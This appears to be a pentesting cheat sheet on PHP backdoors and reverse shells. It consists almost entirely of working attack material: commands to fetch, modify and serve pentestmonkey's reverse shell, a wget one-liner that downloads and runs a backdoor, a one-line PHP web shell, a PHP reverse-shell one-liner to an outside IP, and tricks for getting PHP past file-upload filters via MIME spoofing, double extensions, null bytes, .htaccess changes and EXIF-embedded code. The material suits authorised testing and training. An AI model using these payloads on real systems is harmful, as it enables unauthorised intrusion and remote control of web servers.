security stuff	Shells / Reverse Shells	php
Backdoor Shells
php-reverse-shell
tiniest web shell
p0wny shell
one-liner
image upload vulnerabilities
Resources & More
Backdoor Shells
php-reverse-shell
credit: pentestmonkey: php-reverse-shell.php

# download the repository
git clone https://github.com/pentestmonkey/php-reverse-shell.git

# modify the source so it uses a listener's IP of choice
cd php-reverse-shell
sed -i 's/127.0.0.1/IPADDR/' php-reverse-shell.php

# now the file is ready to be uploaded/downloaded onto the target
# one method is to serve the backdoor from the attacking machine via python's builtin webserver: 
python3 -m http.server
# or
python -m SimpleHTTPServer

# then at the target, download and execute the backdoor
# this one-liner can be used to download the php backdoor and execute it: 
wget 192.168.1.14:/backdoor.php -O /tmp/backdoor.php && php -f /tmp/backdoor.php
tiniest web shell
credit: tiniest web shell ever: 1.php

<pre> <?=`$_GET[1]`?>
save this snippet as 1.php and upload it to the webserver. Pass system commands to the variable 1 in the URL as so: http://192.168.1.14/1.php?1=id

p0wny shell
credit: p0wny shell: shell.php

just upload the file to to the server and visit the file’s URL for a complete shell
one-liner
This php one-liner assumes that the TCP connection uses file descriptor 3:
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
image upload vulnerabilities
bypass content-type filtering and extension checks:
try uploading a file.php, intercepting the request and changing the MIME type (i.e. image/gif image/png image/jpg image/jpeg)
try changing the extension to .PHP instead of .php (lowercase vs uppercase)
try appending additional extensions: ..jpg.php or .php.jpg or .php.foo
try tiggering the NULL byte: .php%00 or .php%00.jpg (also try: .php%00?)
try uploading an image with embedded php: (depends solely on the ability to write to the file: .htaccess)
Add the following to the .htaccess file:
AddType application/x-httpd-php .jpg or AddType application/x-httpd-php5 .jpg

Append some php code to a valid image file:
echo '<?php mail("root@localhost", "test" "mic check 1..2..1..2");' >> image.jpg

In some cases, it may be necessary for the PHP code to prefix the image: (i.e. when trying double extensions)
( echo -n '<?php header("Content-Type: image/jpg"); mail("root@localhost", "test", "mic check..1..2..1..2");?>'; cat original_image.png ) >> image.php.jpg

Upload the file and visit the image’s URL. The image will display and the php code will also execute.
Try also embedding the php code somewhere else in the image (i.e. the EXIF data)
# delete extra headers
jhead -purejpg file.jpg
# edit EXIF data:
jhead -ce file.jpg
# paste your php code in one line: 
<?=$_GET[0]($_POST[1]);?> 
It’s quickest to use curl to execute the script: curl -i -X POST "http://127.0.0.1/phppng.png?0=shell_exec" -d "1=id"
